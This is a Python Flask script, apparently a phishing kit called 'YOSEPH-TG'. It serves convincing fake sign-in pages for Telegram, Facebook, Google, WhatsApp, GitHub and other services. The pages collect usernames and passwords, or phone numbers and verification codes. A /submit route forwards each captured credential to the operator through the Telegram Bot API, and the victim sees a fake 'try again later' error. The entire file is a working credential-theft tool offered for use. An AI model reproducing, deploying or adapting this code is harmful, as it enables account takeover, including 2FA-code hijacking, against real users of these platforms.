import os, requests, sys, base64, time
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration & Security ---
CONFIG_FILE = "config.txt"
TOOL_NAME = "YOSEPH-TG" #
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" # @Yosephalganeh44
SELECTED_PLATFORM = {}

# --- Smart Templates Database ---
# type: 'phone' ለሚሆኑት ስልክና ኮድ፣ 'login' ለሚሆኑት ኢሜይልና ፓስወርድ ይጠይቃል
TEMPLATES = {
    "1": {"name": "Telegram", "color": "#3390ec", "logo": "https://telegram.org/img/t_logo.png", "type": "phone"},
    "2": {"name": "Facebook", "color": "#1877f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg", "type": "login"},
    "3": {"name": "Instagram", "color": "linear-gradient(45deg, #f09433, #dc2743, #bc1888)", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg", "type": "login"},
    "4": {"name": "Google", "color": "#ea4335", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg", "type": "login"},
    "5": {"name": "TikTok", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg", "type": "login"},
    "6": {"name": "WhatsApp", "color": "#25d366", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", "type": "phone"},
    "7": {"name": "Snapchat", "color": "#fffc00", "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "type": "login", "text": "black"},
    "8": {"name": "Twitter/X", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg", "type": "login"},
    "9": {"name": "Netflix", "color": "#e50914", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg", "type": "login"},
    "10": {"name": "GitHub", "color": "#24292e", "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg", "type": "login"}
}

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""\033[96m
 █▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█
 ─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█
 ─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀
      DEVELOPER: \033[93mYoseph (@Yosephalganeh44)\033[96m
 ════════════════════════════════════════\033[0m""")

def check_access():
    clear(); banner()
    p = input("\033[93m[?] Enter Access Password: \033[0m").strip()
    if p != base64.b64decode(ENCODED_PASS).decode():
        print("\033[91m[!] Access Denied!\033[0m"); sys.exit()
    print("\033[92m[+] Access Granted!\033[0m"); time.sleep(1)

def show_menu():
    global SELECTED_PLATFORM
    clear(); banner()
    print("\033[95m  [ SELECT A TARGET PLATFORM ]\033[0m")
    for k, v in TEMPLATES.items():
        print(f"  [\033[92m{k}\033[0m] {v['name']}")
    c = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
    if c in TEMPLATES:
        SELECTED_PLATFORM = TEMPLATES[c]
        print(f"\n\033[92m[*] Serving: {SELECTED_PLATFORM['name']}...\033[0m")
    else: show_menu()

def setup_bot():
    if not os.path.exists(CONFIG_FILE):
        t = input("\033[93m[?] Bot Token: \033[0m").strip()
        i = input("\033[93m[?] Chat ID: \033[0m").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{t}\n{i}")
        return t, i
    with open(CONFIG_FILE, "r") as f:
        d = f.read().splitlines()
        return d[0], d[1]

# --- Smart HTML Template (Tailwind UI) ---
HTML_UI = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ name }} | Secure Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen p-4">
    <div class="bg-white p-8 rounded-3xl shadow-2xl w-full max-w-sm border border-gray-100">
        <img src="{{ logo }}" class="w-16 h-16 mx-auto mb-6 object-contain">
        <h2 id="title" class="text-2xl font-black text-center text-gray-800 mb-2">Sign in</h2>
        <p id="desc" class="text-gray-400 text-center text-sm mb-8">Use your {{ name }} account</p>
        
        <div id="form-body" class="space-y-4">
            {% if type == 'phone' %}
                <input type="tel" id="val1" placeholder="Phone Number (+251...)" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 transition">
                <button onclick="nextStep()" style="background: {{ color }}; color: {{ text_color|default('white') }}" class="w-full p-4 font-black rounded-xl shadow-lg">NEXT</button>
            {% else %}
                <input type="text" id="val1" placeholder="Email or Username" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 transition">
                <input type="password" id="val2" placeholder="Password" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 transition">
                <button onclick="submitData()" style="background: {{ color }}; color: {{ text_color|default('white') }}" class="w-full p-4 font-black rounded-xl shadow-lg">LOG IN</button>
            {% endif %}
        </div>
        <p id="st" class="mt-6 text-center text-sm font-semibold"></p>
    </div>

    <script>
        let savedVal1 = "";
        async function nextStep() {
            savedVal1 = document.getElementById('val1').value;
            if(savedVal1.length < 9) return;
            await fetch('/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:savedVal1, p:'Waiting for Code...'}) });
            document.getElementById('title').innerText = "Enter Code";
            document.getElementById('desc').innerText = "A verification code has been sent to your device.";
            document.getElementById('form-body').innerHTML = `
                <input type="number" id="val2" placeholder="Verification Code" class="w-full p-4 bg-gray-50 border rounded-xl outline-none focus:ring-2 transition">
                <button onclick="submitData()" style="background: {{ color }}; color: {{ text_color|default('white') }}" class="w-full p-4 font-black rounded-xl shadow-lg">VERIFY</button>
            `;
        }
        async function submitData() {
            let v1 = savedVal1 || document.getElementById('val1').value;
            let v2 = document.getElementById('val2').value;
            let st = document.getElementById('st');
            st.className="mt-6 text-center text-gray-500"; st.innerText="Checking credentials...";
            await fetch('/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:v1, p:v2}) });
            setTimeout(() => { st.className="mt-6 text-center text-red-500"; st.innerText="Error: Please try again later."; }, 2000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_UI, name=SELECTED_PLATFORM['name'], color=SELECTED_PLATFORM['color'], 
                                 logo=SELECTED_PLATFORM['logo'], type=SELECTED_PLATFORM['type'],
                                 text_color=SELECTED_PLATFORM.get('text', 'white'))

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    msg = f"🔔 *{TOOL_NAME} - DATA CAPTURED*\n\n" \
          f"🌐 *Platform:* `{SELECTED_PLATFORM['name']}`\n" \
          f"👤 *Login/Phone:* `{data['u']}`\n" \
          f"🔑 *Password/Code:* `{data['p']}`\n\n" \
          f"_Captured on: {time.strftime('%Y-%m-%d %H:%M')}_"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"s": "ok"})

if __name__ == '__main__':
    check_access() #
    BOT_TOKEN, CHAT_ID = setup_bot()
    show_menu()
    # Flask web application hosting
    app.run(host='0.0.0.0', port=5000)
